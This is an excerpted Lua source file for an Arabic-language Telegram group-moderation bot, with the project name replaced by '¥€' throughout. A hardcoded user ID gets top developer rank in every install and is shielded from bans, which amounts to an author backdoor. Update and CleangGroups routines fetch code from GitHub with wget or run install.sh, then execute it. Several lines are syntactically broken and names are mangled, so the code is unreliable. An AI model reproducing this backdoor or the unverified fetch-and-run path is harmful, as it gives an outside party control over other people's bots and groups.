...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1471005940,1471005940}
...
io.popen("mkdir ¥€_Files")
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls ¥€_Files'):lines() do
if v:match(".lua$") then
i = i + 1
...
if hash or DevBot(msg) or Dev¥€(msg) or VIP_DeV(msg) then    
return true 
else 
return false 
end 
...
if hash or Bot(msg) or Dev¥€(msg) or DevBot(msg) or VIP_DeV(msg) or creatorA(msg) then     
return true 
else 
return false 
end 
...
if hash or Bot(msg) or Dev¥€(msg) or DevBot(msg) or BasicConstructor(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
...
if hash or Bot(msg) or Dev¥€(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
...
if hash or Bot(msg) or Dev¥€(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
...
if hash or Bot(msg) or  Dev¥€(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true 
else 
return false 
end 
end
function CleangGroups();local z = io.open('./¥€');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/¥€.lua)(.*)$") then;os.execute('chmod +x install.sh');os.execute('./install.sh get');end;end
function General_ban(user_id,chat_id)
if Dev¥€e(user_id) == true then
var = true
...
if tonumber(user_id) == tonumber(1471005940) then  
var = true  
elseif tonumber(user_id) == tonumber(1471005940) then
var = true  
...
elseif tonumber(user_id) == tonumber(1471005940) then  
var = "مطور السورس"  
elseif Dev¥€e(user_id) == true then
var = "المطور الاساسي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = "البوت"
...
local UserName = (data.username_ or "BBBB5BBBBB")
local NameUser = "[T𝑒𝑎𝑚 𝑚𝑎𝑥 ☆](https://t.me/BBBB5BBBBB)\n — — — — — — — — —\n⌔︙بواسطه -› ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "[T𝑒𝑎𝑚 𝑚𝑎𝑥 ☆](https://t.me/BBBB5BBBBB)\n — — — — — — — — —\n⌔︙اسم المستخدم -› ["..data.first_name_.."](T.me/"..UserName..")"
if status == "lock" then
...
function ¥€_Started_Bot(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,"⌔︙ارفعني مشرف يا بشر ماكدر ") 
database:del(bot_id.."¥€:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"حبيبي يعني شلون اشتغل ذا ما منطيني جميع صلاحيات") 
database:del(bot_id.."¥€:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_, !غيرت صوره بعد شتريد🎉") 
end
end, nil) 
database:del(bot_id.."¥€:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
end   
...
send(msg.chat_id_, msg.id_,"⌔"تم تغيير الوصف راقي")   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."¥€:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "الغاء" then 
send(msg.chat_id_, msg.id_,"⌔︙يلا تم لغيته فكر وردلي خبر") 
database:del(bot_id.."¥€:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."¥€:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id.."¥€:Get:Welcome:Group"..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"⌔︙ تم حفظ ترحيب اخيرا")   
return false   
end
--------------------------------------------------------------------------------------------------------------
...
local ¥€_Msg = database:sismember(bot_id.."¥€:List:Filter:text"..msg.chat_id_,text) 
if ¥€_Msg then    
...
if ker then        
Reply_Status(msg,msg.sender_user_id_,"reply","⌔︙ماتقدر تدز لازم تصير مميز حبيبي")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
...
if phh then        
Reply_Status(msg,msg.sender_user_id_,"reply","⌔︙ماتقدر تدز لازم تصير مميز حبيب")  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
...
send(msg.chat_id_, msg.id_,'⌔︙اشترك بل قناة ما تكدر  . \n ⌔︙قنـاة البـوت ←  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end 
...
send(msg.chat_id_, msg.id_,'⌔︙اشترك بل قناة ماتكدر . \n ⌔︙قنـاة البـوت ←  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end  
...
send(msg.chat_id_, msg.id_,'⌔︙اشترك بقناتي ماتكدر تستخدمني . \n ⌔︙قنـاة البـوت ←  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end 
...
if result.id_ == tonumber(1471005940) then
...
if userid == tonumber(1471005940) then
send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if userid == tonumber(1471005940) then
...
local ¥€rt = database:get(bot_id.."¥€:Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if ¥€rt == "مميز" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"[T𝑒𝑎𝑚 𝑚𝑎𝑥 ☆](https://t.me/BBBB5BBBBB)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "BBBB5BBBBB")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
database:set(bot_id.."¥€:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id.."¥€:Special:User"..msg.chat_id_,result.sender_user_id_)  
elseif ¥€rt == "ادمن" and Owner(msg) then 
send(msg.chat_id_, msg.id_,"[T𝑒𝑎𝑚 𝑚𝑎𝑥 ☆](https://t.me/BBBB5BBBBB)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "BBBB5BBBBB")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
database:set(bot_id.."¥€:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id.."¥€:Mod:User"..msg.chat_id_,result.sender_user_id_)  
elseif ¥€rt == "مدير" and Constructor(msg) then
send(msg.chat_id_, msg.id_,"[T𝑒𝑎𝑚 𝑚𝑎𝑥 ☆](https://t.me/BBBB5BBBBB)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "BBBB5BBBBB")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
database:set(bot_id.."¥€:Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id.."¥€:Manager"..msg.chat_id_,result.sender_user_id_)  
elseif ¥€rt == "عضو" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"[T𝑒𝑎𝑚 𝑚𝑎𝑥 ☆](https://t.me/BBBB5BBBBB)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "BBBB5BBBBB")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
end
end,nil)   
end   
...
if result.id_ then
local ¥€rt = database:get(bot_id.."¥€:Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if ¥€rt == "مميز" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"[T𝑒𝑎𝑚 𝑚𝑎𝑥 ☆](https://t.me/BBBB5BBBBB)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "BBBB5BBBBB")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
database:sadd(bot_id.."¥€:Special:User"..msg.chat_id_,result.id_)  
...
function Function_¥€(extra, result, success)
if result.sender_user_id_ == tonumber(1471005940) then
send(msg.chat_id_, msg.id_, "⌔︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.sender_user_id_ == tonumber(1471005940) then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو -› ['..data.first_name_..'](t.me/'..(data.username_ or '¥€')..') '
...
local gmedia = database:scard(bot_id.."¥€:allM"..msg.chat_id_)  
if gmedia == 200 then
local liste = database:smembers(bot_id.."¥€:allM"..msg.chat_id_)
...
function Function_¥€(extra, result, success)
if Dev¥€e(result.sender_user_id_)  then
...
if Dev¥€e(msg.sender_user_id_)  then
database:srem(bot_id.."DEV:Sudo:T",result.sender_user_id_)
database:srem(bot_id.."¥€:Sudo:User", result.sender_user_id_)
database:srem(bot_id.."¥€:Basic:Constructor"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."¥€:Constructor"..msg.chat_id_, result.sender_user_id_)
...
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, Function_¥€, nil)
end
...
local UserName = (b.username_ or "BBBB5BBBBB")
...
if text == (database:get(bot_id.."¥€:Name:Bot") or "ماكس اكس") then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
Namebot = (database:get(bot_id.."¥€:Name:Bot") or "ماكس اكس")
local namebot = {
...
if database:get(bot_id.."¥€:Status:Bc") and not Dev¥€(msg) then 
...
os.execute('wget https://raw.githubusercontent.com/¥€TEAM/DevAbd/main/¥€.lua')
os.execute('wget https://raw.githubusercontent.com/¥€TEAM/DevAbd/main/start.lua')
dofile('¥€.lua')  
return false
end
if text == "راسلني" then
...
zh = https.request('https://¥€-source.tk/¥€TeAM/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n⌔️︙قائمه الزخرفه \n — — — — — — — — — \n"
i = 0
...
gk = https.request('https://¥€-source.tk/¥€TeAM/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
...
ge = https.request('https://¥€-source.tk/¥€TeAM/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
...
data,res = https.request('https://¥€-source.tk/¥€TeAM/infoInstagram.php?username='..URL.escape(Textni)..'')
if res == 200 then
...
data,res = https.request('https://¥€-source.tk/¥€TeAM/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
...
if text == "غنيلي" then
data,res = https.request('https://¥€-source.tk/¥€TeAM/audios.php')
if res == 200 then
...
st = https.request('https://¥€-source.tk/¥€TeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
...
Srrt = https.request('https://¥€-source.tk/¥€TeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
...
[Source max](http://t.me/BBBB5BBBBB)
     
[Tools max](https://t.me/zwopd)
     
[Tools Source max](http://t.me/MAX56X_BOT)
...
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'¥€:Num:Add:Bot') or 0) and not Dev¥€(msg) then
...
if not Dev¥€(msg) and not database:sismember(bot_id..'BaN:In:User',msg.sender_user_id_) and not database:get(bot_id..'Texting:In:Bv') and not database:get(bot_id.."¥€:Filter"..msg.sender_user_id_) then
...
os.execute('rm -rf ¥€.lua')
os.execute('rm -rf start.lua')
os.execute('wget https://raw.githubusercontent.com/¥€TEAM/¥€/master/¥€.lua')
os.execute('wget https://raw.githubusercontent.com/¥€TEAM/¥€/master/start.lua')
dofile('¥€.lua')  
return false
end
...
inline = {
{{text = '⌔︙ ¥€ 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/BBBB5BBBBB'}},
}
...
local Name_Bot = (database:get(bot_id.."¥€:Name:Bot") or "ماكس اكس")
...
------------------------------------------------------------------------
if text then
local ¥€_Msg = database:sismember(bot_id.."¥€:List:Filter:text"..result.chat_id_,text) 
if ¥€_Msg then    
...
>> The Bot is Running
>> Bot source > ¥€
>>Source channel > @BBBB5BBBBB
>>Source developer > @zwopd
 ╔══╗╔══╗╔═╗╔══╗╔═╦═╗
║══╣╚╗╔╝║╬║║╔╗║║║║║║
╠══║─║║─║╗╣║╠╣║║║║║║
╚══╝─╚╝─╚╩╝╚╝╚╝╚╩═╩╝
